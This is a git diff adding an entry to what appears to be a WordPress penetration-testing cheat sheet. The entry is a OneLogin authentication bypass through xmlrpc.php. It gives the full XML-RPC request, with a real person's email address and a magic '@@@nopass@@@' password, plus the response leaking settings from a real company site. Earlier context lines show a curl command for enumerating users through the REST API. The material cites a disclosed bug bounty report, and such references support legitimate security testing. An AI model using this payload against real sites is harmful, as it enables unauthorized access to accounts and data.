@@ -26,3 +26,45 @@ https://example.com/wp-admin/install.php
 example.com/wp-json/wp/v2/users/
 $ curl https://example.com/\?_method\=GET -d rest_route=/wp/v2/users
 ```
+## OneLogin authentication bypass on WordPress sites via XMLRPC
+- Request
+```bash
+POST /xmlrpc.php
+Host: ex.com
+
+<?xml version="1.0"?>
+<methodCall>
+<methodName>wp.getOptions</methodName>
+<params>
+	<param><value>zzz</value></param>
+        <param><value>cbarry@uber.com</value></param>
+        <param><value>@@@nopass@@@</value></param>
+</params>
+</methodCall>
+```
+- response
+```bash
+<?xml version="1.0" encoding="UTF-8"?>
+<methodResponse>
+  <params>
+    <param>
+      <value>
+      <struct>
+  <member><name>software_name</name><value><struct>
+  <member><name>desc</name><value><string>Software Name</string></value></member>
+  <member><name>readonly</name><value><boolean>1</boolean></value></member>
+  <member><name>value</name><value><string>WordPress</string></value></member>
+</struct></value></member>
+  <member><name>software_version</name><value><struct>
+  <member><name>desc</name><value><string>Software Version</string></value></member>
+  <member><name>readonly</name><value><boolean>1</boolean></value></member>
+  <member><name>value</name><value><string>4.4.3</string></value></member>
+</struct></value></member>
+  <member><name>blog_url</name><value><struct>
+  <member><name>desc</name><value><string>WordPress Address (URL)</string></value></member>
+  <member><name>readonly</name><value><boolean>1</boolean></value></member>
+  <member><name>value</name><value><string>https://newsroom.uber.com</string></value></member>
+...etc.
+```
+##### Exploit scenarios [Check Report](https://hackerone.com/reports/138869)
+
